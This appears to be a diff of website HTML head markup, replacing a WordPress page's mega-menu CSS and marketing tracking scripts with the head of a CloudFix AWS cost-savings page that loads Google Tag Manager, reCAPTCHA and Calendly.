-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-448.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-448>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-448>a { }li#wp-megamenu-item-448> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-448 a { }#wp-megamenu-item-448> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-449.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-449>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-449>a { }li#wp-megamenu-item-449> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-449 a { }#wp-megamenu-item-449> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-477.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-477>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-477>a { }li#wp-megamenu-item-477> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-477 a { }#wp-megamenu-item-477> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-562.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-562>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-562>a { }li#wp-megamenu-item-562> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-562 a { }#wp-megamenu-item-562> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-879.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-879>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-879>a { }li#wp-megamenu-item-879> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-879 a { }#wp-megamenu-item-879> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-881.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-881>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-881>a { }li#wp-megamenu-item-881> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-881 a { }#wp-megamenu-item-881> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 1000px !important;}.wp-megamenu > li.wp-megamenu-item-1187.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 1000px !important;left: calc(100% - 500px - 20px) !important}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-1187>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-1187>a { }li#wp-megamenu-item-1187> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-1187 a { }#wp-megamenu-item-1187> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2514.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2514>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2514>a { }li#wp-megamenu-item-2514> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2514 a { }#wp-megamenu-item-2514> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2521.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2521>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2521>a { }li#wp-megamenu-item-2521> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2521 a { }#wp-megamenu-item-2521> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2542.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2542>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2542>a { }li#wp-megamenu-item-2542> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2542 a { }#wp-megamenu-item-2542> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2567.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2567>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2567>a { }li#wp-megamenu-item-2567> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2567 a { }#wp-megamenu-item-2567> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2655.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2655>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2655>a { }li#wp-megamenu-item-2655> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2655 a { }#wp-megamenu-item-2655> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2677.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2677>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2677>a { }li#wp-megamenu-item-2677> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2677 a { }#wp-megamenu-item-2677> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2676.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2676>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2676>a { }li#wp-megamenu-item-2676> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2676 a { }#wp-megamenu-item-2676> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 240px !important;}.wp-megamenu > li.wp-megamenu-item-2678.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 240px !important;left: calc(100% - 120px - 20px) !important}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2678>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2678>a { }li#wp-megamenu-item-2678> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2678 a { }#wp-megamenu-item-2678> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 1000px !important;}.wp-megamenu > li.wp-megamenu-item-2680.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 1000px !important;left: calc(100% - 500px - 20px) !important}.wp-megamenu-wrap .wpmm-nav-wrap > ul.wp-megamenu li.wpmm_dropdown_menu ul.wp-megamenu-sub-menu li.menu-item-has-children.wp-megamenu-item-2680.wpmm-submenu-right > ul.wp-megamenu-sub-menu {left: 100%;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2680>a { text-align: left !important;}.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2680>a { }li#wp-megamenu-item-2680> ul ul ul> li { margin-left: px !important;width: 100%; display: inline-block;} li#wp-megamenu-item-2680 a { padding-left: px !important;}#wp-megamenu-item-2680> .wp-megamenu-sub-menu { padding-left: px !important;}.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2688.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2688>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2688>a { }li#wp-megamenu-item-2688> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2688 a { }#wp-megamenu-item-2688> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2690.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2690>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2690>a { }li#wp-megamenu-item-2690> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2690 a { }#wp-megamenu-item-2690> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2686.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2686>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2686>a { }li#wp-megamenu-item-2686> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2686 a { }#wp-megamenu-item-2686> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2697.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2697>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2697>a { }li#wp-megamenu-item-2697> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2697 a { }#wp-megamenu-item-2697> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2696.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2696>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2696>a { }li#wp-megamenu-item-2696> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2696 a { }#wp-megamenu-item-2696> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2699.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2699>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2699>a { }li#wp-megamenu-item-2699> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2699 a { }#wp-megamenu-item-2699> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2698.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2698>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2698>a { }li#wp-megamenu-item-2698> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2698 a { }#wp-megamenu-item-2698> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2773.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2773>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2773>a { }li#wp-megamenu-item-2773> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2773 a { }#wp-megamenu-item-2773> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2774.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2774>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2774>a { }li#wp-megamenu-item-2774> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2774 a { }#wp-megamenu-item-2774> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 240px !important;}.wp-megamenu > li.wp-megamenu-item-2776.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 240px !important;left: calc(100% - 120px - 20px) !important}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2776>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2776>a { }li#wp-megamenu-item-2776> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2776 a { }#wp-megamenu-item-2776> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2896.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu-wrap .wpmm-nav-wrap > ul.wp-megamenu li.wpmm_dropdown_menu ul.wp-megamenu-sub-menu li.menu-item-has-children.wp-megamenu-item-2896.wpmm-submenu-right > ul.wp-megamenu-sub-menu {left: 100%;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2896>a { text-align: left !important;}.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2896>a { }li#wp-megamenu-item-2896> ul ul ul> li { margin-left: px !important;width: 100%; display: inline-block;} li#wp-megamenu-item-2896 a { padding-left: px !important;}#wp-megamenu-item-2896> .wp-megamenu-sub-menu { padding-left: px !important;}.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2920.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2920>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2920>a { }li#wp-megamenu-item-2920> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2920 a { }#wp-megamenu-item-2920> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2921.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2921>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2921>a { }li#wp-megamenu-item-2921> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2921 a { }#wp-megamenu-item-2921> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2940.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2940>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2940>a { }li#wp-megamenu-item-2940> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2940 a { }#wp-megamenu-item-2940> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-2950.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-2950>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-2950>a { }li#wp-megamenu-item-2950> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-2950 a { }#wp-megamenu-item-2950> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-3187.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-3187>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-3187>a { }li#wp-megamenu-item-3187> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-3187 a { }#wp-megamenu-item-3187> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-3640.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-3640>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-3640>a { }li#wp-megamenu-item-3640> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-3640 a { }#wp-megamenu-item-3640> .wp-megamenu-sub-menu { }.wp-megamenu-wrap > ul.wp-megamenu > li.wpmm_mega_menu > .wpmm-strees-row-container 
-                        > ul.wp-megamenu-sub-menu { width: 100% !important;}.wp-megamenu > li.wp-megamenu-item-3642.wpmm-item-fixed-width  > ul.wp-megamenu-sub-menu { width: 100% !important;}.wpmm-nav-wrap ul.wp-megamenu>li ul.wp-megamenu-sub-menu #wp-megamenu-item-3642>a { }.wpmm-nav-wrap .wp-megamenu>li>ul.wp-megamenu-sub-menu li#wp-megamenu-item-3642>a { }li#wp-megamenu-item-3642> ul ul ul> li { width: 100%; display: inline-block;} li#wp-megamenu-item-3642 a { }#wp-megamenu-item-3642> .wp-megamenu-sub-menu { }</style><style></style>
-<!-- Google Tag Manager for WordPress by gtm4wp.com -->
-<!-- GTM Container placement set to automatic -->
-<script data-cfasync="false" data-pagespeed-no-defer type="text/javascript">
-	var dataLayer_content = {"pagePostType":"page","pagePostType2":"single-page","pagePostAuthor":"admin"};
-	dataLayer.push( dataLayer_content );
-</script>
-<script data-cfasync="false">
-(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
 j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-'//www.googletagmanager.com/gtm.'+'js?id='+i+dl;f.parentNode.insertBefore(j,f);
-})(window,document,'script','dataLayer','GTM-WTPDTBR');
-</script>
-<!-- End Google Tag Manager -->
-<!-- End Google Tag Manager for WordPress by gtm4wp.com --><!-- --------- START PLUGIN MARKETINGCLOUDFX-WP - HEADER SCRIPTS --------- -->
-	<!-- MCFX - Primary Tracking Script -->
-	<script type='text/javascript' data-registered="mcfx-plugin" >
-		/* global mcfx */
-		(function (w,d,o,a,m) {
-			w[o]=w[o]||function(){(w[o].q=w[o].q||[]).push(arguments);
-			},w[o].e=1*new Date();a=d.createElement('script'),
-			m=d.getElementsByTagName('script')[0];a.async=1;
-			a.src='https://agent.marketingcloudfx.com/mcfx.js';m.parentNode.insertBefore(a, m);
-		})(window, document, 'mcfx');
-		mcfx('create','15989');
-	</script>
-	<!-- MCFX - CallTrackerFX -->
-	<script type="text/javascript" src="//cdn.leadmanagerfx.com/phone/js/15989" data-registered="mcfx-plugin" async ></script>
-	<!-- Helper Script -->
-	<script type='text/javascript' data-registered="mcfx-plugin" >
-		/* global mcfx */
-		window.mcfxCaptureCustomFormData = function( data, formId='form-from-mcfxCaptureCustomFormData' ) {
-			const formEl = document.createElement('form');
-			formEl.id = formId;
-			for ( const field of data ) {
-				const fieldEl = document.createElement('input');
-				fieldEl.type = 'hidden';
-				for ( const key in field ) {
-					fieldEl[key] = field[key];
-				}
-				formEl.appendChild(fieldEl);
-			}
-			mcfx( 'capture', formEl );
-		}
-	</script>
-<!-- --------- END PLUGIN MARKETINGCLOUDFX-WP - HEADER SCRIPTS --------- -->
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-TJXM2T7');</script><title>Nonstop AWS cost savings with CloudFix</title>
+<meta name="cs-utms" data-utms="eyJnY2xpZCI6WyJnY2xpZCIsImdjbGlkX19jIl0sInV0bV9hZGdyb3VwIjpbInV0bV9hZGdyb3VwIiwidXRtQWRncm91cCJdLCJ1dG1fY2FtcGFpZ24iOlsidXRtX2NhbXBhaWduIiwidXRtQ2FtcGFpZ24iXSwidXRtX2NvbnRlbnQiOlsidXRtX2NvbnRlbnQiLCJ1dG1Db250ZW50Il0sInV0bV9tZWRpdW0iOlsidXRtX21lZGl1bSIsInV0bU1lZGl1bSJdLCJ1dG1fc291cmNlIjpbInV0bV9zb3VyY2UiLCJ1dG1Tb3VyY2UiXSwidXRtX3Rlcm0iOlsidXRtX3Rlcm0iLCJ1dG1UZXJtIl19" />
+<script src='https://www.google.com/recaptcha/api.js?render=6LdvveIkAAAAAHZTtEUwgCkLWSOamPRqqUAb83t5&onload=onloadCallback' async defer></script><script>let captchaPassed = sessionStorage.getItem('recaptcha');</script>  <!-- Calendly scripts begin -->
+  <link href='https://assets.calendly.com/assets/external/widget.css' rel='stylesheet'>
+  <script src='https://assets.calendly.com/assets/external/widget.js' type='text/javascript' async></script>
+  <!-- Calendly scripts end -->
+  
+<!-- The SEO Framework by Sybre Waaijer -->
+<meta name="robots" content="max-snippet:-1,max-image-preview:large,max-video-preview:-1" />
+<meta name="description" content="CloudFix is the automatic, always&#x2d;running way to optimize AWS cost and performance." />
+<meta property="og:image" content="https://cloudfix.wpengine.com/wp-content/uploads/CloudFix-Social.png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Nonstop AWS cost savings with CloudFix" />
+<meta property="og:description" content="CloudFix is the automatic, always&#x2d;running way to optimize AWS cost and performance." />
+<meta property="og:url" content="https://cloudfix.aurea.com/" />
+<meta property="og:site_name" content="CloudFix" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Nonstop AWS cost savings with CloudFix" />
+<meta name="twitter:description" content="CloudFix is the automatic, always&#x2d;running way to optimize AWS cost and performance." />
+<meta name="twitter:image" content="https://cloudfix.wpengine.com/wp-content/uploads/CloudFix-Social.png" />
+<meta name="theme-color" content="#ed8705" />
+<link rel="canonical" href="https://cloudfix.aurea.com/" />
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","url":"https://cloudfix.aurea.com/","name":"CloudFix","logo":"https://cloudfix.aurea.com/wp-content/uploads/cropped-cloudfix_favicon.png"}</script>
+<meta name="google-site-verification" content="FszjR3BZ3PkMtMhmsyN2N0rKP96dOocZNpowlzP2ET4" />
+<!-- / The SEO Framework by Sybre Waaijer | 2.72ms meta | 1.13ms boot -->
 
-<link rel="alternate" href="https://kopiustech.com/capabilities/cloud-strategy/" hreflang="en"/>
-<link rel="alternate" href="https://kopiustech.com/es/capabilities/cloud-strategy/" hreflang="es"/>
-		<script>
-			document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );
-		</script>
-				<style>
-			.no-js img.lazyload { display: none; }
-			figure.wp-block-image img.lazyloading { min-width: 150px; }
-							.lazyload, .lazyloading { opacity: 0; }
-				.lazyloaded {
